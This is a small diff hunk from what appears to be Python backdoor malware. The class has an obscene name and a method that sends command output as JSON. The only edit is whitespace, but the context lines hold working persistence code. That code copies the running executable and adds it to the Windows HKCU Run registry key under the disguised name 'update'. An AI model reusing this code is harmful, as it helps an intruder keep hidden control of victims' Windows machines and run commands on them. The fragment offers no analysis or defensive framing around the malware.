@@ -24,7 +24,7 @@ class MotherFucker():
         if not os.path.exists(location):
             shutil.copyfile(sys.executable, location)
             subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
-
+            
     def json_send(self, data):
         """
             Basically just dumps  output of commands   in a json  format and send it over
